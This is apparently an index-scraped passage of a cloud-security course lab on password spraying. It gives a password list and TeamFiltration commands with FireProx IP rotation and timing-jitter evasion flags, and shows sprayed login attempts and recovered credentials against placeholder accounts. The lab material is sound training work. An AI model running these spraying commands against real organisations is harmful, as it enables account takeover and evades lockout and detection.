HTTP request sent, awaiting response... 200 OK Length: 404 [text/plain] Saving to: \u2018passwords.txt\u2019 passwords.txt 100%[=======================================================>] 404 --.-KB/s in 0s 2022-07-19 22:17:33 (48.2 MB/s) - \u2018passwords.txt\u2019 saved [404/404] We now have a list of passwords, and they should be the following passwords for reference: List of Users HumanMusic2023 HumanMusic2024 SnakeJazz2023 SnakeJazz2024 GeniusScientist2023 GeniusScientist2024 HorseVet2023 HorseVet2024 Now let's use the TeamFiltration tool to spray usernames. This tool is one of the only very good tools that we have but like any newly released tool it still has many bugs. As long as we understand: What is the bug that is being caused What is the effect of the bug We can work around these issues. Danger This tool sometimes will crash unexpectedly where you will see errors like: Cannot resolve the Amazon API Gateway that was just created Too many Gateway request for delete at one time False negatives where this may occur in the middle of a scan It is important to note that while this may seem like a problem, in many cases deleting the database can help you recover. Here is a simple way to do so: Command lines rm -Rf /home/sec588/Coursefiles/workdir/teamfiltration Command lines /opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --enum --validate-login --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --usernames /home/sec588/Coursefiles/workdir/usernames.txt Command lines /opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --spray --validate-login --sleep-min 1 --sleep-max 3 --jitter 1 --usernames /home/sec588/Coursefiles/workdir/usernames.txt --passwords /home/sec588/Coursefiles/workdir/passwords.txt --shuffle-users --shuffle-regions Command Info Here is are the command flags in teamfiltration . --usernames : A file containing the usernames --outpath : This is the location where the teamfiltration database will live --config : This is the configuration file to use --validate-login : Use the more \"noisy\" flag in this way it will have 1 bad password attempt per email address --spray : This is to perform a password spraying attack --sleep-min : This will set the minimal sleep interval (1 minutes) --sleep-max : This will set the maximum internal to wait (3 minutes) --jitter : This is the amount to jitter between maximum and minimum time intervals --usernames : This is the file containing usernames --passwords : This is the file containing passwords --shuffle-users : This command is to shuffle the usernames to test so that they are tested in different orders --shuffle-region : This command is to shuffle between regions Expected results sec588@slingshot ~/Coursefiles/workdir $ /opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --config TeamFiltrationConfig_SEC588.json --spray --validate-login --sleep-min 1 --sleep-max 2 --jitter 1 --usernames /home/sec588/Coursefiles/workdir/usernames.txt --passwords /home/sec588/Coursefiles/workdir/passwords.txt --shuffle-users --shuffle-regions \u2553\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u2556 \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u255f\u256c\u256c\u255c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2502 \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2502\u2502 \u2559\u256c\u256c\u255c\u2558 \u2514\u2559\u255c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2553\u2565\u2565\u256c\u256c\u256c\u256c\u256c\u256c\u2565\u2565\u2556 \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2553\u256c\u256b\u256c\u255c\u255c\u2518 \u2559\u255c\u255c\u256c\u256b\u256c\u2510 \u2502\u2502 \u2502\u2502 \u2514\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u255c\u2559\u2569\u256c\u2556\u2553 \u2559\u256c\u256c\u256c \u2502\u2502 \u2502\u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u255c \u2559\u256c\u256b\u2556\u2556 \u2553 \u2559\u256c\u2556 \u2502\u2502 \u251c\u2502\u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c \u2553\u2556 \u2559\u256c\u256c\u256c\u256c\u256c\u256c\u2566 \u256c\u256c \u2502\u250c \u2553\u256c\u2524\u2502\u2502 \u2553\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2553\u256c\u2524 \u256c\u256c\u256c \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u255c\u255c\u255c\u256c\u256c\u2556 \u255f\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u2555 \u250c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u2524 \u2559\u2569\u2518 \u2559\u256c\u256c\u256c\u256c\u256c\u2569 \u255f\u256c\u256c \u2559\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u256c\u256c\u2556\u2556\u2556\u2566\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u2524 \u255f\u256c\u256c \u2502\u2502 \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c \u2566\u2556 \u2557\u2556 \u256c\u256c \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2514\u256c\u2510 \u2559\u256c\u2556\u2556 \u2553\u256c\u256c\u255c \u2553\u256c\u2518 \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2514\u256c\u2556 \u2559\u2569\u2568\u256c\u256c\u256c\u2569\u2568\u255c\u255c \u2552\u256c\u256c \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2559\u256c\u256c\u256c\u2556 \u250c\u2556\u256b\u256c\u255c\u2518 \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2559\u2569\u256c\u256c\u256c\u2565\u2565\u2565\u2565\u2565\u2565\u256b\u256c\u256c\u255c\u255c \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2559\u2559\u255c\u255c\u255c\u255b \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2502\u2502 \u2502 \u2553\u2556\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2502\u2502 \u256c\u2566\u2566\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2502\u2502 \u2553\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u256c\u2556\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u2514\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u255c \u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c [\u2665] TeamFiltration V3.5.2 PUBLIC, created by @Flangvik at @TrustedSec [+] Args parsed --outpath /home/sec588/Coursefiles/workdir/teamfiltration --config TeamFiltrationConfig_SEC588.json --spray --validate-login --sleep-min 1 --sleep-max 2 --jitter 1 --usernames /home/sec588/Coursefiles/workdir/usernames.txt --passwords /home/sec588/Coursefiles/workdir/passwords.txt --shuffle-users --shuffle-regions [SPRAY] 7/10/2023 5:55:54 PM EST Sleeping between 0-1 minutes for each round [FIREPROX] 7/10/2023 5:55:57 PM EST Created endpoint https://qfoh15k23f.execute-api.us-east-1.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:55:58 PM EST Created endpoint https://6sx8tyelbc.execute-api.us-east-2.amazonaws.com/fireprox/ [SPRAY] us-east-2 7/10/2023 5:55:59 PM EST Sprayed summer@CUSTOMDOMAIN.DOMAIN:SURPRISE1 => INVALID [SPRAY] us-east-2 7/10/2023 5:55:59 PM EST Sprayed beth@CUSTOMDOMAIN.DOMAIN:SURPRISE1 => INVALID [SPRAY] us-east-1 7/10/2023 5:55:59 PM EST Sprayed jerry@CUSTOMDOMAIN.DOMAIN:SURPRISE1 => VALID [SPRAY] us-east-1 7/10/2023 5:56:00 PM EST Sprayed rick@CUSTOMDOMAIN.DOMAIN:SURPRISE1 => INVALID [FIREPROX] 7/10/2023 5:56:03 PM EST Deleted endpoint https://qfoh15k23f.execute-api.us-east-1.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:56:12 PM EST Deleted endpoint https://6sx8tyelbc.execute-api.us-east-2.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:56:13 PM EST Created endpoint https://2srukgej58.execute-api.us-east-1.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:56:13 PM EST Created endpoint https://c24peto6z1.execute-api.us-east-2.amazonaws.com/fireprox/ [SPRAY] us-east-2 7/10/2023 5:56:14 PM EST Sprayed terry@CUSTOMDOMAIN.DOMAIN:SURPRISE2 => INVALID [SPRAY] us-east-2 7/10/2023 5:56:14 PM EST Sprayed jerry@CUSTOMDOMAIN.DOMAIN:SURPRISE2 => INVALID [SPRAY] us-east-2 7/10/2023 5:56:14 PM EST Sprayed rick@CUSTOMDOMAIN.DOMAIN:SURPRISE2 => VALID [SPRAY] us-east-1 7/10/2023 5:56:14 PM EST Sprayed summer@CUSTOMDOMAIN.DOMAIN:SURPRISE2 => INVALID [FIREPROX] 7/10/2023 5:56:50 PM EST Deleted endpoint https://2srukgej58.execute-api.us-east-1.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:56:50 PM EST Deleted endpoint https://c24peto6z1.execute-api.us-east-2.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:56:51 PM EST Created endpoint https://4zx14b0g2l.execute-api.us-east-1.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:56:52 PM EST Created endpoint https://3t0w65kfg8.execute-api.us-east-2.amazonaws.com/fireprox/ [SPRAY] us-east-1 7/10/2023 5:56:53 PM EST Sprayed jerry@CUSTOMDOMAIN.DOMAIN:SURPRISE3 => INVALID [SPRAY] us-east-2 7/10/2023 5:56:53 PM EST Sprayed terry@CUSTOMDOMAIN.DOMAIN:SURPRISE3 => INVALID [SPRAY] us-east-2 7/10/2023 5:56:53 PM EST Sprayed rick@CUSTOMDOMAIN.DOMAIN:SURPRISE3 => INVALID [SPRAY] us-east-1 7/10/2023 5:56:54 PM EST Sprayed summer@CUSTOMDOMAIN.DOMAIN:SURPRISE3 => INVALID [FIREPROX] 7/10/2023 5:57:05 PM EST Deleted endpoint https://4zx14b0g2l.execute-api.us-east-1.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:57:06 PM EST Deleted endpoint https://3t0w65kfg8.execute-api.us-east-2.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:57:06 PM EST Created endpoint https://9zjw7cg287.execute-api.us-east-1.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:57:07 PM EST Created endpoint https://ke9cpz8pb4.execute-api.us-east-2.amazonaws.com/fireprox/ [SPRAY] us-east-2 7/10/2023 5:57:08 PM EST Sprayed summer@CUSTOMDOMAIN.DOMAIN:SURPRISE4 => INVALID [SPRAY] us-east-1 7/10/2023 5:57:08 PM EST Sprayed rick@CUSTOMDOMAIN.DOMAIN:SURPRISE4 => INVALID [SPRAY] us-east-1 7/10/2023 5:57:08 PM EST Sprayed terry@CUSTOMDOMAIN.DOMAIN:SURPRISE4 => VALID [SPRAY] us-east-1 7/10/2023 5:57:08 PM EST Sprayed jerry@CUSTOMDOMAIN.DOMAIN:SURPRISE4 => INVALID [FIREPROX] 7/10/2023 5:57:12 PM EST Deleted endpoint https://9zjw7cg287.execute-api.us-east-1.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:57:46 PM EST Deleted endpoint https://ke9cpz8pb4.execute-api.us-east-2.amazonaws.com/fireprox/ Danger In certain circumstances you may see the following error (or stack trace) Unhandled exception. Amazon.APIGateway.Model.TooManyRequestsException: Too Many Requests ---> Amazon.Runtime.Internal.HttpErrorResponseException: Exception of type 'Amazon.Runtime.Internal.HttpErrorResponseException' was thrown. at Amazon.Runtime.HttpWebRequestMessage.GetResponseAsync(CancellationToken cancellationToken) at Amazon.Runtime.Internal.HttpHandler`1.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.Unmarshaller.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.ErrorHandler.InvokeAsync[T](IExecutionContext executionContext) --- End of inner exception stack trace --- at Amazon.Runtime.Internal.HttpErrorResponseExceptionHandler.HandleExceptionStream(IRequestContext requestContext, IWebResponseData httpErrorResponse, HttpErrorResponseException exception, Stream responseStream) at Amazon.Runtime.Internal.HttpErrorResponseExceptionHandler.HandleExceptionAsync(IExecutionContext executionContext, HttpErrorResponseException exception) at Amazon.Runtime.Internal.ExceptionHandler`1.HandleAsync(IExecutionContext executionContext, Exception exception) at Amazon.Runtime.Internal.ErrorHandler.ProcessExceptionAsync(IExecutionContext executionContext, Exception exception) at Amazon.Runtime.Internal.ErrorHandler.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.CallbackHandler.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.Signer.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.EndpointDiscoveryHandler.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.EndpointDiscoveryHandler.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.CredentialsRetriever.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.RetryHandler.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.RetryHandler.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.CallbackHandler.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.CallbackHandler.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.ErrorCallbackHandler.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.MetricsHandler.InvokeAsync[T](IExecutionContext executionContext) at TeamFiltration.Handlers.AWSHandler.DeleteFireProxEndpoint(String fireProxId, String region) at TeamFiltration.Modules.Spray.SprayAsync(String[] args) at TeamFiltration.Program.Main(String[] args) at TeamFiltration.Program.<Main>(String[] args) [1] 26392 IOT instruction (core dumped) /opt/teamfiltration/TeamFiltration --outpath --config --spray --sleep-min If this occurs you are free to rerun the application, the stacktrace is solely due to AWS suppressing the number of API gateway requests and teamfiltration unable to handle the error. How can we review the results? We can use the --database flags. Command lines /opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --database Command lines show creds Command lines exit Danger This tool still is a work in progress and doesn't necessarily finish correctly. Please make special note that if you get 3 out of 5 or 2 out of 5 credentials this is fine. We can still work on labs even with a few passwords. If you feel that you have to get the exact number then you can attempt to delete the database and try again. Do this after class Expected results sec588@slingshot ~/Coursefiles/workdir $ /opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --database \u2553\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u2556 \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u255f\u256c\u256c\u255c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2502 \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2502\u2502 \u2559\u256c\u256c\u255c\u2558 \u2514\u2559\u255c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2553\u2565\u2565\u256c\u256c\u256c\u256c\u256c\u256c\u2565\u2565\u2556 \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2553\u256c\u256b\u256c\u255c\u255c\u2518 \u2559\u255c\u255c\u256c\u256b\u256c\u2510 \u2502\u2502 \u2502\u2502 \u2514\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u255c\u2559\u2569\u256c\u2556\u2553 \u2559\u256c\u256c\u256c \u2502\u2502 \u2502\u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u255c \u2559\u256c\u256b\u2556\u2556 \u2553 \u2559\u256c\u2556 \u2502\u2502 \u251c\u2502\u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c \u2553\u2556 \u2559\u256c\u256c\u256c\u256c\u256c\u256c\u2566 \u256c\u256c \u2502\u250c \u2553\u256c\u2524\u2502\u2502 \u2553\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2553\u256c\u2524 \u256c\u256c\u256c \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u255c\u255c\u255c\u256c\u256c\u2556 \u255f\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u2555 \u250c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u2524 \u2559\u2569\u2518 \u2559\u256c\u256c\u256c\u256c\u256c\u2569 \u255f\u256c\u256c \u2559\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u256c\u256c\u2556\u2556\u2556\u2566\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u2524 \u255f\u256c\u256c \u2502\u2502 \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c \u2566\u2556 \u2557\u2556 \u256c\u256c \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2514\u256c\u2510 \u2559\u256c\u2556\u2556 \u2553\u256c\u256c\u255c \u2553\u256c\u2518 \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2514\u256c\u2556 \u2559\u2569\u2568\u256c\u256c\u256c\u2569\u2568\u255c\u255c \u2552\u256c\u256c \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2559\u256c\u256c\u256c\u2556 \u250c\u2556\u256b\u256c\u255c\u2518 \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2559\u2569\u256c\u256c\u256c\u2565\u2565\u2565\u2565\u2565\u2565\u256b\u256c\u256c\u255c\u255c \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2559\u2559\u255c\u255c\u255c\u255b \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2502\u2502 \u2502 \u2553\u2556\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2502\u2502 \u256c\u2566\u2566\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2502\u2502 \u2553\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u256c\u2556\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u2514\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u255c \u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c [\u2665] TeamFiltration V3.5.2 PUBLIC, created by @Flangvik at @TrustedSec [+] Args parsed --outpath /home/sec588/Coursefiles/workdir/teamfiltration --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --database [+] Attempting to load database file /home/sec588/Coursefiles/workdir/teamfiltration/TeamFiltration.db [+] Available commands: show <emails|creds|attempts|summary|fireprox> export <emails|creds|attempts|summary> <csv|json> <path> delete <*|fireprox-id> <fireprox-region> exit [?] CMD #> show creds +----+----------------------+--------------+-------+-------------------+-------------------+---------------------+ | Id | DateTime | Disqualified | Valid | ConditionalAccess | Username | Password | +----+----------------------+--------------+-------+-------------------+-------------------+---------------------+ | 18 | 7/10/2023 9:55:59 PM | False | True | True | jerry@CUSTOMDOMAIN.DOMAIN | SURPRISE1 | +----+----------------------+--------------+-------+-------------------+-------------------+---------------------+ | 23 | 7/10/2023 9:56:14 PM | False | True | True | rick@CUSTOMDOMAIN.DOMAIN | SURPRISE2 | +----+----------------------+--------------+-------+-------------------+-------------------+---------------------+ | 30 | 7/10/2023 9:56:55 PM | False | True | True | beth@CUSTOMDOMAIN.DOMAIN | SURPRISE3 | +----+----------------------+--------------+-------+-------------------+-------------------+---------------------+ | 39 | 7/10/2023 9:57:50 PM | False | True | False | summer@CUSTOMDOMAIN.DOMAIN | SURPRISE5 | +----+----------------------+--------------+-------+-------------------+-------------------+---------------------+ exit","title":"Identities Lab 2"},{"location":"labs/identities/02-identities/#attacking-user-identities-passwords","text":"","title":"Attacking User Identities - Passwords!"},{"location":"labs/identities/02-identities/#brief-intro","text":"Welcome to our User Identities WorkShop Section 2, PASSWORDS!","title":"Brief Intro"},{"location":"labs/identities/02-identities/#requirements-for-this-lab","text":"","title":"Requirements for This Lab"},{"location":"labs/identities/02-identities/#walkthrough","text":"We are now going to create a list of passwords in a file. This password file can be found here . You can also download it using the following command line snippet: Command lines cd /home/sec588/Coursefiles/workdir Command lines wget http://localhost/workbook/labs/identities/files/passwords.txt Expected results sec588@slingshot:/opt/Wordlister$ wget http://localhost/workbook/labs/identities/files/passwords.txt --2022-07-19 22:17:33-- http://localhost/workbook/labs/identities/files/passwords.txt Resolving localhost (localhost)... 127.0.0.1, ::1 Connecting to localhost (localhost)|127.0.0.1|:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 404 [text/plain] Saving to: \u2018passwords.txt\u2019 passwords.txt 100%[=======================================================>] 404 --.-KB/s in 0s 2022-07-19 22:17:33 (48.2 MB/s) - \u2018passwords.txt\u2019 saved [404/404] We now have a list of passwords, and they should be the following passwords for reference: List of Users HumanMusic2023 HumanMusic2024 SnakeJazz2023 SnakeJazz2024 GeniusScientist2023 GeniusScientist2024 HorseVet2023 HorseVet2024 Now let's use the TeamFiltration tool to spray usernames. This tool is one of the only very good tools that we have but like any newly released tool it still has many bugs. As long as we understand: What is the bug that is being caused What is the effect of the bug We can work around these issues. Danger This tool sometimes will crash unexpectedly where you will see errors like: Cannot resolve the Amazon API Gateway that was just created Too many Gateway request for delete at one time False negatives where this may occur in the middle of a scan It is important to note that while this may seem like a problem, in many cases deleting the database can help you recover. Here is a simple way to do so: Command lines rm -Rf /home/sec588/Coursefiles/workdir/teamfiltration Command lines /opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --enum --validate-login --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --usernames /home/sec588/Coursefiles/workdir/usernames.txt Command lines /opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --spray --validate-login --sleep-min 1 --sleep-max 3 --jitter 1 --usernames /home/sec588/Coursefiles/workdir/usernames.txt --passwords /home/sec588/Coursefiles/workdir/passwords.txt --shuffle-users --shuffle-regions Command Info Here is are the command flags in teamfiltration . --usernames : A file containing the usernames --outpath : This is the location where the teamfiltration database will live --config : This is the configuration file to use --validate-login : Use the more \"noisy\" flag in this way it will have 1 bad password attempt per email address --spray : This is to perform a password spraying attack --sleep-min : This will set the minimal sleep interval (1 minutes) --sleep-max : This will set the maximum internal to wait (3 minutes) --jitter : This is the amount to jitter between maximum and minimum time intervals --usernames : This is the file containing usernames --passwords : This is the file containing passwords --shuffle-users : This command is to shuffle the usernames to test so that they are tested in different orders --shuffle-region : This command is to shuffle between regions Expected results sec588@slingshot ~/Coursefiles/workdir $ /opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --config TeamFiltrationConfig_SEC588.json --spray --validate-login --sleep-min 1 --sleep-max 2 --jitter 1 --usernames /home/sec588/Coursefiles/workdir/usernames.txt --passwords /home/sec588/Coursefiles/workdir/passwords.txt --shuffle-users --shuffle-regions \u2553\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u2556 